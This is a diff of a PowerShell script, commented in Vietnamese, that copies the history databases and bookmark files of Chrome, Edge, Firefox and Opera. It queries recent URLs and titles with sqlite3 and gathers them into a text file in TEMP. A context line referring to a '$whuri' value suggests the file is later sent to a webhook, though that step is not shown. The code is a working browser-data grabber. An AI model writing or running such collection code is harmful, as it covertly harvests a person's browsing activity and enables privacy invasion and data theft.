@@ -29,10 +29,10 @@ if ($whuri.Length -lt 120){
 $outpath = "$env:TEMP\browser_history.txt"
 "Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding UTF8
 
-# Định nghĩa regex để lọc URL
+# Regex để lọc URL
 $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-# Định nghĩa đường dẫn dữ liệu
+# Đường dẫn dữ liệu
 $Paths = @{
     'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
     'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
@@ -43,7 +43,7 @@ $Paths = @{
     'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
 }
 
-# Duyệt qua các trình duyệt và loại dữ liệu
+# Danh sách trình duyệt và loại dữ liệu
 $Browsers = @('chrome', 'edge', 'firefox', 'opera')
 $DataValues = @('history', 'bookmarks')
 
@@ -53,29 +53,28 @@ foreach ($Browser in $Browsers) {
         $Path = $Paths[$PathKey]
 
         if (Test-Path $Path) {
-            if ($DataValue -eq 'history' -and $Browser -in @('chrome','edge','opera','firefox')) {
+            if ($DataValue -eq 'history') {
                 # Copy file History sang Temp để tránh bị khóa
                 $copyPath = "$env:TEMP\${Browser}_HistoryCopy"
                 Copy-Item $Path $copyPath -Force
 
-                # Query bằng sqlite3.exe nếu có
                 if (Test-Path $sqlitePath) {
-                    & $sqlitePath $copyPath "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20;" | Out-File -FilePath $outpath -Append -Encoding UTF8
+                    # Query bằng sqlite3.exe, gắn nhãn Browser + DataType
+                    & $sqlitePath $copyPath "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20;" |
+                        ForEach-Object {
+                            "$Browser [$DataValue] | $_" | Out-File -FilePath $outpath -Append -Encoding UTF8
+                        }
                 } else {
-                    "Không tìm thấy sqlite3.exe để query $Browser history." | Out-File -FilePath $outpath -Append
+                    "$Browser [$DataValue] | Không tìm thấy sqlite3.exe để query." | Out-File -FilePath $outpath -Append
                 }
 
                 Remove-Item $copyPath -Force
             } else {
-                # Với bookmarks hoặc file text, chỉ lọc bằng regex
+                # Với bookmarks, lọc bằng regex và gắn nhãn
                 $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique
                 $Value | ForEach-Object {
-                    [PSCustomObject]@{
-                        Browser  = $Browser
-                        DataType = $DataValue
-                        Content  = $_
-                    }
-                } | Out-File -FilePath $outpath -Append
+                    "$Browser [$DataValue] | $_" | Out-File -FilePath $outpath -Append
+                }
             }
         }
     }
